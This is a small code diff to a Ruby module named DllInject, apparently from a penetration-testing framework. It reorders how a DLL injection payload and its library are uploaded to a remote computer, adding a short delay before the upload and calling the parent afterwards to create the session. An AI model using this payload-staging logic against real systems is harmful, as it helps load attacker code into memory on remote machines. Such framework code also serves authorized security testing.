@@ -210,10 +210,7 @@ module DllInject
 	# Transmits the DLL injection payload and its associated DLL to the remote
 	# computer so that it can be loaded into memory.
 	#
-	def handle_connection(conn)
-		# Call the parent so that the stage gets sent
-		super
-
+	def handle_connection_stage(conn)
 		data = library_name + "\x00"
 
 		begin
@@ -226,6 +223,10 @@ module DllInject
 			return
 		end
 
+		# Give the stage a second or so, just so it doesn't try
+		# to read in the DLL as part of the stage...
+		Rex::ThreadSafe.sleep(1.5)
+
 		print_status("Uploading DLL (#{data.length} bytes)...")
 
 		# Send the size of the thing we're transferring
@@ -234,6 +235,9 @@ module DllInject
 		conn.put(data)
 
 		print_status("Upload completed.")
+
+		# Call the parent so the session gets created.
+		super
 	end
 
 end
